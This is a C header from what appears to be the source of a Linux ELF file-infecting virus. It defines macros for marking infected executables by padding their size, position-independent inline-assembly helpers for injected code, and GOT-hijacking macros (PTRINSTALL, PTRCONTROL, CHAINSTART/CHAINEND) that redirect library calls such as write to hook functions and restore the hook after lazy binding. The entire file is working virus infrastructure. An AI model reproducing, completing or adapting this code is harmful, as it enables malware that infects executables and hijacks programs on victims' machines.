

/* infection marker macros
 * INFECTED_SET will increase the value to a infection marker size
 * INFECTED_IS will check for the marker
 *
 * FIXME: INFECT_PERCENT macro does not work. for some reason gcc assigns
 *        a static variable to the values for division. uhm.
 */
#if 0
#define	INFECT_PERCENT	((unsigned int) 90)
#define	INFECT_PADUP	((unsigned int)(400 / (100 - INFECT_PERCENT)))
#endif

/* false positive rates (slipped through when infecting)
 *
 * INFECT_PADUP | rate of virgin executeables falsely detected as infected
 * -------------+---------------------------------------------------------
 *   0x4        | 100.0 %
 *   0x8        |  50.0 %
 *  0x0a        |  40.0 %
 *  0x10        |  25.0 %
 *  0x14        |  20.0 %
 *  0x20        |  12.5 %
 *  0x28        |  10.0 %
 *  0x40        |   6.25 %
 *  0x50        |   5.0 %
 *  0x80        |   3.125 %
 *  0xc8        |   2.0 %
 * 0x100        |   1.5625 %
 * 0x190        |   1.0 %
 * 0x200        |   0.78125 %
 */

#define	INFECT_PADUP	0xc8
#define	INFECTED_SET(isize) \
{ \
	(isize) += INFECT_PADUP - ((isize) % INFECT_PADUP); \
}

#define	INFECTED_IS(isize) \
	(((isize) % INFECT_PADUP) == 0)


/* STRINGPTR macro to create a const string directly within the code.
 * the string 'string' is assigned to the char * 'dst'. do not use it
 * twice if you need the same string, but copy the resulting pointer,
 * as each use of the macro dupes the string. use as this:
 *
 *	char * foo;
 *	STRINGPTR(foo,"bar");
 */
#define STRINGPTR(dst,string) \
{ \
	register unsigned char * regtmp; \
	\
	__asm__ __volatile__ ( \
		"	call	l0_%=\n\t" \
		"	.asciz	\""##string"\"\n\t" \
		"l0_%=:	popl	%%eax\n\t" \
		: "=a" (regtmp)); \
\
	(dst) = regtmp; \
}


/* STATICPTR macro creates a fixed amount of space right where it is used,
 * and loads the pointer 'dst' to point to the first byte of the space.
 * use like this:
 *
 *     void *   data;
 *     STATICPTR (data, "256");
 *
 * would reserve 256 bytes of data.
 */
#define STATICPTR(dst,lenstr) \
{ \
	register unsigned char * regtmp; \
	\
	__asm__ __volatile__ ( \
		"	call	l0_%=\n\t" \
		"	.fill	"##lenstr", 1, 0x0\n" \
		"l0_%=:	popl	%%eax\n\t" \
		: "=a" (regtmp)); \
\
	(dst) = regtmp; \
}


/* the following three macros are used to redirect function calls and to
 * retrieve the absolute address of virus-functions.
 *
 * do not put a colon ';' after using the CHAINSTRUCT macro.
 */

#define	CHAINSTRUCT(arraylen) \
struct { \
	void *		chain;	/* address to chain call to */ \
	void *		any;	/* transport pointer for user data */ \
	unsigned int	gotcount; \
	unsigned int *	gotloc[arraylen];	/* .got entry address */ \
} * cstr;


/* FUNCPTR, computes the absolute address for a function, based on relative
 * data only. use like this:
 *
 * 	unsigned int	my_write_addr;
 * 	FUNCPTR (my_write_addr, "my_write");
 */
/*
		"l0_%=:	movl	($"##functionname" - $l0_%=), %%eax\n" \
*/

#define	FUNCPTR(dst,functionname) \
{ \
	register unsigned int	fptr; \
	\
	__asm__ __volatile__ ( \
		"	call	l0_%=\n" \
		"l0_%=:	movl	$"##functionname", %%eax\n" \
		"	subl	$l0_%=, %%eax\n" \
		"	popl	%%edx\n" \
		"	addl	%%edx, %%eax\n" \
		: "=a" (fptr) : : "edx"); \
	\
	(dst) = (void *) fptr; \
}


/* PTRINSTALL, macro to work together with PTRCONTROL. see wrcore.c for
 * usage example
 *
 * hook = function pointer to hook function (your function)
 * chain = function pointer to original function (old function)
 * any = (void *) for your needs, accessible through chainstruct->any
 * gotarray = (Elf32_Word *arr[]), pointer to array of GOT locations
 * gotcount = elements used in array, must be at least one
 */

#define	PTRINSTALL_ARRAY(hook,chain,any,gotarray,gotcount) \
{ \
	__asm__ __volatile__ ( \
		"	call	l0_%=\n" \
		"lr_%=:	jmp	lo_%=\n" \
		"l0_%=:	pushl	%%ecx\n" \
		"	pushl	$"##gotcount"\n" \
		"	pushl	%%ebx\n" \
		"	pushl	%%edx\n" \
		"	pushl	$0x64466226\n" \
		"	jmpl	*%%eax\n" \
		"lo_%=:\n" \
		: : "a" (hook), "c" (gotarray), "d" (chain), "b" (any)); \
}

/* convenience macro for one got entry only (most commonly required)
 */
#define	PTRINSTALL(hook,chain,gotloc,any) \
	PTRINSTALL_ARRAY(hook,chain,any,&gotloc,"1");


/* PTRCONTROL, macro to be placed at the beginning of a hook function. works
 * together with PTRINSTALL.
 *
 * FIXME: the $lp_%= and $l1_%= instructions put the absolute address, which
 *        is not what we want. it works still, because we don't access them,
 *        and only do relative computations. but we waste memory and expose
 *        the original linking address because of this. fix it. also the
 *        FUNCPTR macro is having the same weakness
 */

#define	PTRCONTROL(chainstr,arraylen) \
{ \
	__asm__ __volatile__ ( \
		"	jmp	l0_%=\n" \
		"lp_%=:	.fill	3, 4, 0x0\n" \
		"	.fill	"##arraylen", 4, 0x0\n" \
		"\n" \
		"l0_%=:	call	l1_%=\n" \
		"l1_%=:	popl	%%edx\n" \
		"	addl	$lp_%=, %%edx\n" \
		"	subl	$l1_%=, %%edx\n" \
		"\n" \
		"	pushl	%%eax\n" \
		"	movl	0x4(%%ebp), %%eax\n" \
		"	cmpl	$0x64466226, %%eax\n"	/* magic */ \
		"	jne	lo_%=\n" \
		"\n" \
		"	movl	0x8(%%ebp), %%eax\n" \
		"	movl	%%eax, (%%edx)\n"	/* chain */ \
		"	movl	0xc(%%ebp), %%eax\n" \
		"	movl	%%eax, 4(%%edx)\n"	/* any */ \
		"	movl	0x10(%%ebp), %%ecx\n"	/* load counter */ \
		"	movl	%%ecx, 8(%%edx)\n" \
		"	pushl	%%esi\n" \
		"	movl	0x14(%%ebp), %%esi\n"	/* source array */ \
		"	leal	12(%%edx), %%edx\n" \
		"l2_%=:	lodsl\n" \
		"	movl	%%eax, (%%edx)\n" \
		"	addl	$0x4, %%edx\n" \
		"	decl	%%ecx\n" \
		"	jnz	l2_%=\n" \
		"	popl	%%esi\n" \
		"\n" \
		"	popl	%%eax\n" \
		"	movl	%%ebp, %%esp\n" \
		"	popl	%%ebp\n" \
		"	addl	$0x14, %%esp\n" \
		"	ret\n" \
		"\n" \
		"lo_%=:	popl	%%eax\n" \
		: "=d" (chainstr) : : "eax"); \
}

/* convenience macros, use if you want and don't care about the messy details
 * use CHAINSTART directly after local variables of the hook-function,
 * CHAINCALL directly before calling the original function, and CHAINEND after
 * the chain function has been called:
 *
 * int
 * my_write (int fd, char *buf, int len)
 * {
 * 	int	rval;
 * 	int	(* old_write)(int, char *, int);
 *
 * 	CHAINSTART (old_write);
 * 	CHAINCALL;
 * 	rval = old_write (fd, buf, len);
 * 	CHAINEND;
 *
 * 	return (rval);
 * }
 *
 * would be the most basic chain-through function for the 'write' function.
 *
 * XXX: it is utmost important to put the CHAINSTART macro directly after the
 *      local variables, before any code.
 *
 * CHAINCALL is used to prepare the %ebx register to point to the shared GOT
 * table. technically, it is only needed when redirecting shared library GOT
 * table entries, but it does not hurt to include it in any case.
 *
 * CHAINEND checks whether the GOT entry was overwritten by the runtime
 * linker, as it happens when lazy binding is used and the function is called
 * the first time. we update our address (cstr->chain) and overwrite the GOT
 * entry again with our function. this has to be done, since we usually
 * receive control, before any library function has been called. you can leave
 * the CHAINEND macro out, if you want to receive control only once, on the
 * first call (say, when the host is calling exit or fork). though it is not
 * guaranted that it will be only called once.
 */
#define	CHAINSTART(chainfn) \
	CHAINSTART_M(chainfn,1,"1");

#define	CHAINEND \
	CHAINEND_M;

#define	CHAINSTART_M(chainfn,arraylen,arraylenstr) \
	CHAINSTRUCT(arraylen) \
	unsigned int *	cthis[arraylen]; \
	unsigned int	creg_ebx; \
	unsigned int	cgot_wk; \
	\
	__asm__ __volatile__ ("" : "=b" (creg_ebx)); \
	PTRCONTROL (cstr,arraylenstr); \
	chainfn = (void *) cstr->chain; \
	for (cgot_wk = 0 ; cgot_wk < cstr->gotcount && \
		cstr->gotloc[cgot_wk] != NULL ; ++cgot_wk) \
	{ \
		cthis[cgot_wk] = (unsigned int *) *cstr->gotloc[cgot_wk]; \
	}

#define	CHAINCALL \
	__asm__ __volatile__ ("" : : "b" (creg_ebx));

#define	CHAINEND_M \
	for (cgot_wk = 0 ; cgot_wk < cstr->gotcount && \
		cstr->gotloc[cgot_wk] != NULL ; ++cgot_wk) \
	{ \
		if (cthis[cgot_wk] != (unsigned int *) *cstr->gotloc[cgot_wk]) { \
			cstr->chain = (void *) *cstr->gotloc[cgot_wk]; \
			*cstr->gotloc[cgot_wk] = (unsigned int) cthis[cgot_wk]; \
		} \
	}


/* old macros, still work, but its better to just have to maintain one version
 */
#if 0
#define	CHAINSTART(chainfn) \
	CHAINSTRUCT(1) \
	unsigned int *	cthis; \
	unsigned int	creg_ebx; \
	\
	__asm__ __volatile__ ("" : "=b" (creg_ebx)); \
	PTRCONTROL (cstr); \
	chainfn = cstr->chain; \
	cthis = (unsigned int *) *cstr->gotloc[0];

#define	CHAINEND \
	if (((unsigned int) cthis) != *cstr->gotloc[0]) { \
		cstr->chain = (void *) *cstr->gotloc[0]; \
		*cstr->gotloc[0] = (unsigned int) cthis; \
	}
#endif

